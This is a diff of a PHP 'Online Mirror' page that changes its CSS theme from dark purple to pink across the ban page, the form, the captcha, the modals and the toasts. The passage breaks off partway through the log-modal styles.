@@ -51,7 +51,7 @@ if (isIPBanned()) {
     if ($is_system && $ban_info && $ban_info['created_at']) {
         $remaining = max(0, 86400 - (time() - strtotime($ban_info['created_at'])));
     }
-    die('<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>访问被拒绝</title><style>body{background:#0f0c29;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,80,80,0.2);border-radius:24px;padding:40px;max-width:420px;width:100%;text-align:center;animation:fadeInUp 0.5s ease-out}.card .icon{font-size:64px;margin-bottom:16px}.card h1{font-size:24px;color:#ff6b6b;margin:0 0 4px}.card .sub{color:#8080a0;font-size:13px;line-height:1.6;margin:0}.card .reason{color:#a0a0b8;font-size:15px;line-height:1.6;margin:16px 0 0;padding:12px 16px;background:rgba(255,80,80,0.08);border-radius:12px;border:1px solid rgba(255,80,80,0.12)}.countdown-wrap{margin-top:20px;padding:16px;background:rgba(102,126,234,0.08);border:1px solid rgba(102,126,234,0.15);border-radius:14px}.countdown-wrap .label{font-size:12px;color:#8080a0;margin-bottom:6px}.countdown-wrap .timer{font-size:28px;font-weight:700;font-family:monospace;color:#667eea;letter-spacing:2px;animation:pulse 2s ease-in-out infinite}.countdown-wrap .hint{font-size:11px;color:#606080;margin-top:6px}</style>
+    die('<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>访问被拒绝</title><style>body{background:#0f0c29;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}@keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,80,80,0.2);border-radius:24px;padding:40px;max-width:420px;width:100%;text-align:center;animation:fadeInUp 0.5s ease-out}.card .icon{font-size:64px;margin-bottom:16px}.card h1{font-size:24px;color:#ff6b6b;margin:0 0 4px}.card .sub{color:#8080a0;font-size:13px;line-height:1.6;margin:0}.card .reason{color:#a0a0b8;font-size:15px;line-height:1.6;margin:16px 0 0;padding:12px 16px;background:rgba(255,80,80,0.08);border-radius:12px;border:1px solid rgba(255,80,80,0.12)}.countdown-wrap{margin-top:20px;padding:16px;background:rgba(170,212,244,0.08);border:1px solid rgba(170,212,244,0.15);border-radius:14px}.countdown-wrap .label{font-size:12px;color:#8080a0;margin-bottom:6px}.countdown-wrap .timer{font-size:28px;font-weight:700;font-family:monospace;color:#aad4f4;letter-spacing:2px;animation:pulse 2s ease-in-out infinite}.countdown-wrap .hint{font-size:11px;color:#606080;margin-top:6px}</style>
 </head><body><div class="card"><div class="icon">🚫</div><h1>拒绝访问</h1><p class="sub">您的请求已被系统拒绝</p><p class="reason">' . $ban_reason . '</p>' . ($is_system ? '<div class="countdown-wrap"><div class="label">⏳ 自动解封倒计时</div><div class="timer" id="countdown">' . sprintf('%02d:%02d:%02d', floor($remaining/3600), floor(($remaining%3600)/60), $remaining%60) . '</div><div class="hint">封禁到期后将自动刷新</div></div><script>var r=' . $remaining . ';!function t(){if(r<=0)location.reload();else{var e=document.getElementById("countdown");e&&(e.textContent=String(Math.floor(r/3600)).padStart(2,"0")+":"+String(Math.floor(r%3600/60)).padStart(2,"0")+":"+String(r%60).padStart(2,"0")),r--,setTimeout(t,1000)}}()</script>' : '') . '</div></body></html>');
 }
 
@@ -153,6 +153,122 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
 <title>Online Mirror</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <style>
+/* ==================== 基础重置 ==================== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: linear-gradient(160deg, #D9A090 0%, #D97AB8 100%);
+    background-attachment: fixed;
+    min-height: 100vh;
+    color: #4a2038;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    padding: 0;
+}
+
+/* ==================== 容器：取消卡片效果，平铺全屏 ==================== */
+.container {
+    background: transparent;
+    border: none;
+    border-radius: 0;
+    box-shadow: none;
+    padding: 28px 18px 40px;
+    max-width: 600px;
+    width: 100%;
+    margin: 0 auto;
+    animation: fadeInUp 0.5s ease-out;
+}
+
+/* ==================== Logo ==================== */
+.logo {
+    text-align: center;
+    margin-bottom: 26px;
+}
+.logo i {
+    font-size: 48px;
+    background: linear-gradient(135deg, #FF5391, #FF9CDA);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+.logo h1 {
+    font-size: 28px;
+    margin-top: 10px;
+    background: linear-gradient(90deg, #FF5391, #FF9CDA, #FFB09C);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+.logo p {
+    color: #8a5a72;
+    font-size: 14px;
+    margin-top: 6px;
+}
+
+/* ==================== 表单 ==================== */
+.form-group {
+    margin-bottom: 18px;
+}
+.form-group label {
+    display: block;
+    font-size: 14px;
+    color: #6b2d4a;
+    margin-bottom: 6px;
+    font-weight: 600;
+}
+.form-group label i {
+    margin-right: 6px;
+    width: 18px;
+}
+.form-group input, .form-group select {
+    width: 100%;
+    padding: 12px 16px;
+    border: 1px solid rgba(255,255,255,0.85);
+    border-radius: 12px;
+    background: rgba(255,255,255,0.55);
+    color: #4a2038;
+    font-size: 15px;
+    transition: all 0.3s;
+    outline: none;
+}
+.form-group input::placeholder {
+    color: #a8788e;
+}
+.form-group input:focus, .form-group select:focus {
+    border-color: #FF5391;
+    box-shadow: 0 0 0 3px rgba(255,83,145,0.18);
+    background: rgba(255,255,255,0.85);
+}
+.form-group select option {
+    background: #fff;
+    color: #4a2038;
+}
+
+/* ==================== 主按钮 ==================== */
+.btn-generate {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #FF5391, #FF9CDA);
+    color: #fff;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.3s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    box-shadow: 0 6px 20px rgba(255,83,145,0.35);
+}
+.btn-generate:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 28px rgba(255,83,145,0.45);
+}
+.btn-generate:active { transform: translateY(0); }
+
+/* ==================== 开关 ==================== */
 .toggle-group {
     display: flex;
     align-items: center;
@@ -161,29 +277,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
 }
 .toggle-group .label {
     font-size: 14px;
-    color: #b0b0c8;
+    color: #6b2d4a;
     display: flex;
     align-items: center;
     gap: 6px;
+    font-weight: 600;
 }
 .toggle-group .label small {
     font-size: 12px;
-    color: #606080;
+    color: #9a6a82;
+    font-weight: 400;
 }
 .toggle {
     width: 44px;
     height: 24px;
     border-radius: 12px;
-    background: rgba(255,255,255,0.12);
+    background: rgba(255,255,255,0.5);
+    border: 1px solid rgba(255,255,255,0.85);
     cursor: pointer;
     position: relative;
     transition: all 0.3s;
-    border: none;
     padding: 0;
     flex-shrink: 0;
 }
 .toggle.on {
-    background: linear-gradient(135deg, #667eea, #764ba2);
+    background: linear-gradient(135deg, #FF5391, #FF9CDA);
+    border-color: transparent;
 }
 .toggle .knob {
     width: 20px;
@@ -194,7 +313,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
     top: 2px;
     left: 2px;
     transition: all 0.3s;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+    box-shadow: 0 1px 3px rgba(0,0,0,0.2);
 }
 .toggle.on .knob {
     left: 22px;
@@ -208,102 +327,62 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
     display: block;
 }
 
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
-    min-height: 100vh;
-    color: #e0e0e0;
+/* ==================== 结果区域 ==================== */
+.result-box {
+    margin-top: 24px;
+    padding: 18px;
+    background: rgba(255,255,255,0.42);
+    border: 1px solid rgba(255,255,255,0.7);
+    border-radius: 16px;
+    display: <?php echo $generated_link ? 'block' : 'none'; ?>;
+}
+.result-box h3 {
+    font-size: 14px;
+    color: #6b2d4a;
+    margin-bottom: 10px;
     display: flex;
     align-items: center;
-    justify-content: center;
-    padding: 20px;
-}
-.container {
-    background: rgba(255,255,255,0.05);
-    backdrop-filter: blur(20px);
-    -webkit-backdrop-filter: blur(20px);
-    border: 1px solid rgba(255,255,255,0.1);
-    border-radius: 24px;
-    padding: 40px;
-    max-width: 580px;
-    width: 100%;
-    box-shadow: 0 25px 50px rgba(0,0,0,0.5);
-}
-.logo {
-    text-align: center;
-    margin-bottom: 30px;
-}
-.logo i {
-    font-size: 48px;
-    background: linear-gradient(135deg, #667eea, #764ba2);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-}
-.logo h1 {
-    font-size: 28px;
-    margin-top: 10px;
-    background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-}
-.logo p {
-    color: #a0a0b8;
-    font-size: 14px;
-    margin-top: 6px;
-}
-.form-group {
-    margin-bottom: 18px;
-}
-.form-group label {
-    display: block;
-    font-size: 14px;
-    color: #b0b0c8;
-    margin-bottom: 6px;
-    font-weight: 500;
-}
-.form-group label i {
-    margin-right: 6px;
-    width: 18px;
-}
-.form-group input, .form-group select {
-    width: 100%;
-    padding: 12px 16px;
-    border: 1px solid rgba(255,255,255,0.12);
-    border-radius: 12px;
-    background: rgba(255,255,255,0.06);
-    color: #e0e0e0;
-    font-size: 15px;
-    transition: all 0.3s;
-    outline: none;
-}
-.form-group input:focus, .form-group select:focus {
-    border-color: #667eea;
-    box-shadow: 0 0 0 3px rgba(102,126,234,0.2);
-    background: rgba(255,255,255,0.08);
-}
-.form-group select option { background: #1a1a2e; color: #e0e0e0; }
-.btn-generate {
-    width: 100%;
-    padding: 14px;
-    border: none;
-    border-radius: 12px;
-    background: linear-gradient(135deg, #667eea, #764ba2);
-    color: white;
-    font-size: 16px;
+    gap: 6px;
     font-weight: 600;
-    cursor: pointer;
-    transition: all 0.3s;
+}
+.result-box .link-display {
     display: flex;
-    align-items: center;
-    justify-content: center;
     gap: 8px;
 }
-.btn-generate:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 8px 25px rgba(102,126,234,0.4);
+.result-box .link-display input {
+    flex: 1;
+    padding: 10px 14px;
+    border: 1px solid rgba(255,255,255,0.85);
+    border-radius: 10px;
+    background: rgba(255,255,255,0.75);
+    color: #4a2038;
+    font-size: 13px;
+    word-break: break-all;
+    outline: none;
 }
-.btn-generate:active { transform: translateY(0); }
+.result-box .link-display button {
+    padding: 10px 16px;
+    border: none;
+    border-radius: 10px;
+    background: linear-gradient(135deg, #FF5391, #FF9CDA);
+    color: #fff;
+    cursor: pointer;
+    font-size: 14px;
+    transition: all 0.3s;
+    white-space: nowrap;
+}
+.result-box .link-display button:hover { opacity: 0.88; }
+.result-box .tips {
+    margin-top: 12px;
+    padding: 12px;
+    background: rgba(255,255,255,0.5);
+    border: 1px solid rgba(255,193,7,0.45);
+    border-radius: 10px;
+    font-size: 13px;
+    color: #a06800;
+    line-height: 1.6;
+}
+.result-box .tips strong { color: #8a5a00; }
 
 /* 二维码 */
 .qrcode-wrap {
@@ -317,106 +396,60 @@ body {
     background: #fff;
     padding: 8px;
     transition: transform 0.3s;
+    box-shadow: 0 6px 18px rgba(255,83,145,0.2);
 }
 .qrcode-wrap img:hover {
     transform: scale(1.05);
 }
 
-/* 结果区域 */
-.result-box {
-    margin-top: 24px;
-    padding: 20px;
-    background: rgba(255,255,255,0.05);
-    border-radius: 16px;
-    border: 1px solid rgba(255,255,255,0.08);
-    display: <?php echo $generated_link ? 'block' : 'none'; ?>;
-}
-.result-box h3 {
-    font-size: 14px;
-    color: #a0a0b8;
-    margin-bottom: 10px;
-    display: flex;
-    align-items: center;
-    gap: 6px;
-}
-.result-box .link-display {
-    display: flex;
-    gap: 8px;
-}
-.result-box .link-display input {
-    flex: 1;
-    padding: 10px 14px;
-    border: 1px solid rgba(255,255,255,0.12);
-    border-radius: 10px;
-    background: rgba(0,0,0,0.3);
-    color: #c0c0d8;
-    font-size: 13px;
-    word-break: break-all;
-    outline: none;
-}
-.result-box .link-display button {
-    padding: 10px 16px;
-    border: none;
-    border-radius: 10px;
-    background: linear-gradient(135deg, #667eea, #764ba2);
-    color: white;
-    cursor: pointer;
-    font-size: 14px;
-    transition: all 0.3s;
-    white-space: nowrap;
-}
-.result-box .link-display button:hover { opacity: 0.85; }
-.result-box .tips {
-    margin-top: 12px;
-    padding: 12px;
-    background: rgba(255,200,0,0.08);
-    border: 1px solid rgba(255,200,0,0.15);
-    border-radius: 10px;
-    font-size: 13px;
-    color: #d0b84a;
-    line-height: 1.6;
-}
-.result-box .tips strong { color: #f0d060; }
-
-/* 页脚 */
+/* ==================== 页脚 ==================== */
 .footer {
     margin-top: 24px;
     text-align: center;
     font-size: 13px;
-    color: #606080;
+    color: #9a6a82;
 }
 .footer a {
-    color: #667eea;
+    color: #FF5391;
     text-decoration: none;
+    font-weight: 600;
 }
 .footer a:hover { text-decoration: underline; }
-.footer .divider { margin: 0 8px; color: #404060; }
+.footer .divider { margin: 0 8px; color: rgba(255,255,255,0.85); }
 .footer .social-links {
-    display:flex; align-items:center; justify-content:center; gap:12px;
-    margin-bottom:10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 10px;
 }
 .footer .social-links a {
-    display:inline-flex; align-items:center; gap:4px;
-    padding:6px 12px; border-radius:8px;
-    background:rgba(255,255,255,0.04);
-    border:1px solid rgba(255,255,255,0.06);
-    color:#a0a0b8; font-size:12px; transition:all 0.3s;
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 6px 12px;
+    border-radius: 8px;
+    background: rgba(255,255,255,0.45);
+    border: 1px solid rgba(255,255,255,0.8);
+    color: #6b2d4a;
+    font-size: 12px;
+    transition: all 0.3s;
 }
 .footer .social-links a:hover {
-    background:rgba(255,255,255,0.08);
-    border-color:rgba(102,126,234,0.3);
-    color:#e0e0e0;
+    background: rgba(255,255,255,0.85);
+    border-color: #FF5391;
+    color: #FF5391;
 }
 .footer .social-links a.dev-btn {
-    background:rgba(102,126,234,0.1);
-    border-color:rgba(102,126,234,0.2);
-    color:#667eea;
+    background: rgba(255,255,255,0.55);
+    border-color: rgba(255,255,255,0.9);
+    color: #FF5391;
 }
 .footer .social-links a.dev-btn:hover {
-    background:rgba(102,126,234,0.2);
+    background: rgba(255,255,255,0.95);
 }
 
-/* ====== 滑动验证码 ====== */
+/* ==================== 滑动验证码 ==================== */
 .slide-captcha {
     margin-bottom: 14px;
     text-align: left;
@@ -424,15 +457,16 @@ body {
 .slide-captcha .sc-label {
     display: block;
     font-size: 13px;
-    color: #b0b0c8;
+    color: #6b2d4a;
     margin-bottom: 4px;
+    font-weight: 600;
 }
 .slide-captcha .sc-track {
     position: relative;
     height: 44px;
     border-radius: 12px;
-    background: rgba(255,255,255,0.06);
-    border: 1px solid rgba(255,255,255,0.12);
+    background: rgba(255,255,255,0.5);
+    border: 1px solid rgba(255,255,255,0.85);
     overflow: hidden;
     cursor: pointer;
     user-select: none;
@@ -443,10 +477,10 @@ body {
     top: 0;
     bottom: 0;
     width: 0;
-    background: linear-gradient(90deg, #667eea, #764ba2);
+    background: linear-gradient(90deg, #FF5391, #FF9CDA);
     border-radius: 12px;
     transition: width 0.2s;
-    opacity: 0.6;
+    opacity: 0.7;
 }
 .slide-captcha .sc-thumb {
     position: absolute;
@@ -455,7 +489,7 @@ body {
     width: 40px;
     height: 40px;
     border-radius: 10px;
-    background: linear-gradient(135deg, #667eea, #764ba2);
+    background: linear-gradient(135deg, #FF5391, #FF9CDA);
     color: #fff;
     display: flex;
     align-items: center;
@@ -463,7 +497,7 @@ body {
     font-size: 14px;
     cursor: grab;
     z-index: 2;
-    box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+    box-shadow: 0 2px 8px rgba(255,83,145,0.4);
     transition: box-shadow 0.2s;
 }
 .slide-captcha .sc-thumb:active { cursor: grabbing; }
@@ -477,12 +511,13 @@ body {
     align-items: center;
     justify-content: center;
     font-size: 13px;
-    color: #8080a0;
+    color: #9a6a82;
     z-index: 1;
     pointer-events: none;
 }
 .slide-captcha .sc-thumb.verified {
     background: linear-gradient(135deg, #4caf50, #2e7d32);
+    box-shadow: 0 2px 8px rgba(76,175,80,0.4);
 }
 .slide-captcha .sc-track.verified {
     border-color: #4caf50;
@@ -495,82 +530,118 @@ body {
     display: none;
 }
 
-/* 开发者弹窗 */
+/* ==================== 弹窗（深色内嵌，配合弹窗内联浅色文字） ==================== */
 .dev-modal {
-    display:none;
-    position:fixed; top:0; left:0; right:0; bottom:0;
-    z-index:9999; background:rgba(0,0,0,0.85);
-    justify-content:center; align-items:center;
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    z-index: 9999;
+    background: rgba(74,32,56,0.55);
+    backdrop-filter: blur(6px);
+    -webkit-backdrop-filter: blur(6px);
+    justify-content: center;
+    align-items: center;
 }
-.dev-modal.show { display:flex; }
+.dev-modal.show { display: flex; }
 .dev-modal .modal-box {
-    background:#1a1a2e;
-    border:1px solid rgba(255,255,255,0.12);
-    border-radius:16px; overflow:hidden;
-    width:90vw; max-width:380px;
+    background: #2b1420;
+    border: 1px solid rgba(255,156,218,0.25);
+    border-radius: 16px;
+    overflow: hidden;
+    width: 90vw;
+    max-width: 380px;
 }
 .dev-modal .modal-header {
-    padding:14px 20px; display:flex; justify-content:space-between; align-items:center;
-    border-bottom:1px solid rgba(255,255,255,0.06);
+    padding: 14px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid rgba(255,156,218,0.12);
 }
-.dev-modal .modal-header h3 { font-size:16px; }
+.dev-modal .modal-header h3 {
+    font-size: 16px;
+    color: #f5e0ea;
+}
 .dev-modal .modal-header .close-btn {
-    font-size:24px; color:#8080a0; cursor:pointer; border:none; background:none;
+    font-size: 24px;
+    color: #b08fa4;
+    cursor: pointer;
+    border: none;
+    background: none;
 }
-.dev-modal .modal-header .close-btn:hover { color:#fff; }
-.dev-modal .modal-body { padding:20px; }
+.dev-modal .modal-header .close-btn:hover { color: #fff; }
+.dev-modal .modal-body { padding: 20px; }
 
-/* 开发者卡片 */
+/* ==================== 开发者卡片 ==================== */
 .dev-card {
-    background:rgba(255,255,255,0.04);
-    border:1px solid rgba(255,255,255,0.08);
-    border-radius:12px; padding:20px;
-    text-align:center; cursor:pointer;
-    transition:all 0.3s;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,156,218,0.18);
+    border-radius: 12px;
+    padding: 20px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.3s;
 }
 .dev-card:hover {
-    background:rgba(255,255,255,0.08);
-    border-color:rgba(102,126,234,0.3);
-    transform:translateY(-2px);
+    background: rgba(255,83,145,0.15);
+    border-color: rgba(255,83,145,0.45);
+    transform: translateY(-2px);
 }
 .dev-card .avatar {
-    width:72px; height:72px; border-radius:50%;
-    border:3px solid rgba(102,126,234,0.3);
-    margin:0 auto 12px; display:block;
-    object-fit:cover;
+    width: 72px;
+    height: 72px;
+    border-radius: 50%;
+    border: 3px solid rgba(255,83,145,0.45);
+    margin: 0 auto 12px;
+    display: block;
+    object-fit: cover;
 }
 .dev-card .name {
-    font-size:18px; font-weight:600; color:#e0e0e0;
+    font-size: 18px;
+    font-weight: 600;
+    color: #f5e0ea;
 }
 .dev-card .badge {
-    display:inline-block;
-    padding:2px 10px; border-radius:6px;
-    background:rgba(255,193,7,0.15); color:#ffc107;
-    font-size:11px; margin-top:4px;
+    display: inline-block;
+    padding: 2px 10px;
+    border-radius: 6px;
+    background: rgba(255,193,7,0.15);
+    color: #ffc107;
+    font-size: 11px;
+    margin-top: 4px;
 }
 .dev-card .motto {
-    font-size:13px; color:#8080a0;
-    margin-top:8px; font-style:italic;
+    font-size: 13px;
+    color: #b08fa4;
+    margin-top: 8px;
+    font-style: italic;
 }
 .dev-card .click-hint {
-    font-size:11px; color:#606080; margin-top:10px;
+    font-size: 11px;
+    color: #8a6a7e;
+    margin-top: 10px;
 }
 
-/* 复制邮箱toast */
+/* ==================== Toast ==================== */
 .copy-toast {
-    position:fixed; top:50%; left:50%;
-    transform:translate(-50%,-50%) scale(0.8);
-    padding:16px 28px; border-radius:12px;
-    background:rgba(0,0,0,0.9); color:#fff;
-    font-size:14px; z-index:10000;
-    opacity:0; transition:all 0.3s ease;
-    pointer-events:none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%,-50%) scale(0.8);
+    padding: 16px 28px;
+    border-radius: 12px;
+    background: rgba(43,20,32,0.94);
+    color: #fff;
+    font-size: 14px;
+    z-index: 10000;
+    opacity: 0;
+    transition: all 0.3s ease;
+    pointer-events: none;
 }
 .copy-toast.show {
-    opacity:1; transform:translate(-50%,-50%) scale(1);
+    opacity: 1;
+    transform: translate(-50%,-50%) scale(1);
 }
-
-/* Toast */
 .toast {
     position: fixed;
     top: 20px;
@@ -578,22 +649,23 @@ body {
     transform: translateX(-50%) translateY(-100px);
     padding: 12px 24px;
     border-radius: 12px;
-    background: rgba(0,0,0,0.85);
-    color: white;
+    background: rgba(43,20,32,0.92);
+    color: #fff;
     font-size: 14px;
     transition: transform 0.4s ease;
     z-index: 999;
     pointer-events: none;
 }
 .toast.show { transform: translateX(-50%) translateY(0); }
-.toast.success { background: rgba(0,200,80,0.9); }
+.toast.success { background: linear-gradient(135deg, #FF5391, #FF9CDA); }
 
+/* ==================== 响应式 ==================== */
 @media (max-width: 480px) {
-    .container { padding: 24px 16px; }
+    .container { padding: 20px 14px 32px; }
     .logo h1 { font-size: 22px; }
 }
 
-/* ========== 🎬 动画 ========== */
+/* ==================== 动画 ==================== */
 @keyframes fadeInUp {
     from { opacity: 0; transform: translateY(20px); }
     to { opacity: 1; transform: translateY(0); }
@@ -615,28 +687,16 @@ body {
     100% { background-position: 200% 0; }
 }
 @keyframes glow {
-    0%, 100% { box-shadow: 0 0 5px rgba(102,126,234,0.3); }
-    50% { box-shadow: 0 0 20px rgba(102,126,234,0.6); }
+    0%, 100% { box-shadow: 0 0 5px rgba(255,83,145,0.3); }
+    50% { box-shadow: 0 0 20px rgba(255,83,145,0.6); }
 }
 @keyframes float {
     0%, 100% { transform: translateY(0); }
     50% { transform: translateY(-6px); }
 }
 
-.container { animation: fadeInUp 0.5s ease-out; }
-.stat-card { animation: fadeInUp 0.5s ease-out backwards; }
-.stat-card:nth-child(1) { animation-delay: 0.05s; }
-.stat-card:nth-child(2) { animation-delay: 0.1s; }
-.stat-card:nth-child(3) { animation-delay: 0.15s; }
-.stat-card:nth-child(4) { animation-delay: 0.2s; }
-.result-box { animation: fadeInUp 0.4s ease-out; }
-
 .btn-generate { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
-.btn-generate:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(102,126,234,0.4); animation: pulse 1.5s infinite; }
-.btn-generate:active { transform: translateY(0); }
-
-.stat-card { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
-.stat-card:hover { transform: translateY(-4px); border-color: rgba(102,126,234,0.4); box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
+.btn-generate:hover { animation: pulse 1.5s infinite; }
 
 .toggle { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
 .toggle:hover { transform: scale(1.05); }
@@ -648,282 +708,275 @@ body {
 .footer .social-links a:hover { transform: translateY(-2px); }
 
 .dev-modal .modal-box { animation: fadeInUp 0.3s ease-out; }
-.dev-modal.show .modal-box { animation: fadeInUp 0.3s ease-out; }
 
 .result-box .link-display button { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
-.result-box .link-display button:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(102,126,234,0.3); }
+.result-box .link-display button:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(255,83,145,0.35); }
 
-.toast { transition: all 0.3s cubic-bezier(0.4,0,0.2,1); }
-</style>
+.result-box { animation: fadeInUp 0.4s ease-out; }
 
-<!-- ====== 🩹 修复日志弹窗样式 ====== -->
-<style>
-/* 修复日志按钮 */
+/* ==================== 修复日志按钮 ==================== */
 .footer .social-links a.log-btn {
-    background:rgba(255,107,107,0.08);
-    border-color:rgba(255,107,107,0.18);
-    color:#ff7e7e;
-    position:relative;
-    overflow:hidden;
+    background: rgba(255,255,255,0.45);
+    border-color: rgba(255,255,255,0.8);
+    color: #FF5391;
+    position: relative;
+    overflow: hidden;
 }
 .footer .social-links a.log-btn::before {
-    content:'';
-    position:absolute;
-    top:-50%; left:-50%;
-    width:200%; height:200%;
-    background:conic-gradient(transparent, rgba(255,107,107,0.08), transparent 30%);
-    animation:logRotate 6s linear infinite;
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: conic-gradient(transparent, rgba(255,83,145,0.15), transparent 30%);
+    animation: logRotate 6s linear infinite;
 }
 @keyframes logRotate {
-    to { transform:rotate(360deg); }
+    to { transform: rotate(360deg); }
 }
 .footer .social-links a.log-btn span {
-    position:relative;
-    z-index:1;
+    position: relative;
+    z-index: 1;
 }
 .footer .social-links a.log-btn:hover {
-    background:rgba(255,107,107,0.18);
-    border-color:rgba(255,107,107,0.35);
-    color:#ff9999;
-    transform:translateY(-2px);
+    background: rgba(255,255,255,0.9);
+    border-color: #FF5391;
+    color: #FF5391;
+    transform: translateY(-2px);
 }
 
-/* 修复日志弹窗 */
+/* ==================== 修复日志弹窗 ==================== */
 .log-modal {
-    display:none;
-    position:fixed; top:0; left:0; right:0; bottom:0;
-    z-index:99999; background:rgba(0,0,0,0.88);
-    justify-content:center; align-items:center;
-    backdrop-filter:blur(6px);
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    z-index: 99999;
+    background: rgba(74,32,56,0.55);
+    backdrop-filter: blur(6px);
+    -webkit-backdrop-filter: blur(6px);
+    justify-content: center;
+    align-items: center;
 }
-.log-modal.show { display:flex; }
+.log-modal.show { display: flex; }
 .log-modal .log-box {
-    background:#151528;
-    border:1px solid rgba(255,255,255,0.1);
-    border-radius:20px;
-    width:92vw; max-width:680px;
-    max-height:85vh;
-    display:flex; flex-direction:column;
-    animation:fadeInUp 0.35s ease-out;
-    box-shadow:0 20px 60px rgba(0,0,0,0.5);
+    background: #2b1420;
+    border: 1px solid rgba(255,156,218,0.22);
+    border-radius: 20px;
+    width: 92vw;
+    max-width: 680px;
+    max-height: 85vh;
+    display: flex;
+    flex-direction: column;
+    animation: fadeInUp 0.35s ease-out;
+    box-shadow: 0 20px 60px rgba(74,32,56,0.5);
 }
 .log-modal .log-header {
-    padding:16px 24px;
-    display:flex; align-items:center; justify-content:space-between;
-    border-bottom:1px solid rgba(255,255,255,0.06);
-    flex-shrink:0;
+    padding: 16px 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-bottom: 1px solid rgba(255,156,218,0.12);
+    flex-shrink: 0;
 }
 .log-modal .log-header h3 {
-    font-size:17px;
-    display:flex; align-items:center; gap:8px;
+    font-size: 17px;
+    color: #f5e0ea;
+    display: flex;
+    align-items: center;
+    gap: 8px;
 }
 .log-modal .log-header h3 .badge-new {
-    font-size:10px;
-    background:rgba(255,107,107,0.2);
-    color:#ff7e7e;
-    padding:2px 8px;
-    border-radius:6px;
-    animation:pulse 2s ease-in-out infinite;
+    font-size: 10px;
+    background: rgba(255,83,145,0.25);
+    color: #FF9CDA;
+    padding: 2px 8px;
+    border-radius: 6px;
+    animation: pulse 2s ease-in-out infinite;
 }
 .log-modal .log-close {
-    width:32px; height:32px;
-    display:flex; align-items:center; justify-content:center;
-    border:none; border-radius:10px;
-    background:rgba(255,255,255,0.06);
-    color:#8080a0; font-size:14px;
-    cursor:pointer; transition:all 0.3s;
+    width: 32px;
+    height: 32px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: none;
+    border-radius: 10px;
+    background: rgba(255,255,255,0.06);
+    color: #b08fa4;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s;
 }
 .log-modal .log-close:hover {
-    background:rgba(255,80,80,0.15);
-    color:#ff6b6b;
-    transform:rotate(90deg);
+    background: rgba(255,83,145,0.2);
+    color: #FF9CDA;
+    transform: rotate(90deg);
 }
 .log-modal .log-body {
-    padding:20px 24px;
-    overflow-y:auto;
-    flex:1;
-    font-size:13px;
-    line-height:1.8;
-    color:#c0c0d0;
+    padding: 20px 24px;
+    overflow-y: auto;
+    flex: 1;
+    font-size: 13px;
+    line-height: 1.8;
